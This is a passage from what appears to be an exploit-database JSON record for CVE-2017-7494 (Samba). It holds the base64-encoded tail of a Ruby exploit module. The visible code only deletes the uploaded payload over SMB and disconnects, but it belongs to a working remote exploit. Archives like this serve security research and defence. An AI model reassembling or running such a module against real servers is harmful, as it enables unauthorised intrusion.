VzY3VlIFJleDo6U3RyZWFtQ2xvc2VkRXJyb3IsIFJleDo6UHJvdG86OlNNQjo6RXhjZXB0aW9uczo6Tm9SZXBseQ0KICAgIGVuZA0KDQogICAgIyBDbGVhbnVwIHRoZSBwYXlsb2FkDQogICAgYmVnaW4NCiAgICAgIHNpbXBsZS5jb25uZWN0KCJcXFxcI3tyaG9zdH1cXCN7QHNoYXJlfSIpDQogICAgICB1cGxvYWRlZF9wYXRoID0gQHBhdGgubGVuZ3RoID09IDAgPyAiXFwje0BwYXlsb2FkX25hbWV9IiA6ICJcXCN7QHBhdGh9XFwje0BwYXlsb2FkX25hbWV9Ig0KICAgICAgc2ltcGxlLmRlbGV0ZSh1cGxvYWRlZF9wYXRoKQ0KICAgIHJlc2N1ZSBSZXg6OlN0cmVhbUNsb3NlZEVycm9yLCBSZXg6OlByb3RvOjpTTUI6OkV4Y2VwdGlvbnM6Ok5vUmVwbHkNCiAgICBlbmQNCg0KICAgICMgU2h1dGRvd24NCiAgICBkaXNjb25uZWN0DQogIGVuZA0KDQplbmQ=", 
    "filename": "platforms/linux/remote/42084.rb", 
    "id": "42084", 
    "cves": [
        "CVE-2017-7494"
    ]
}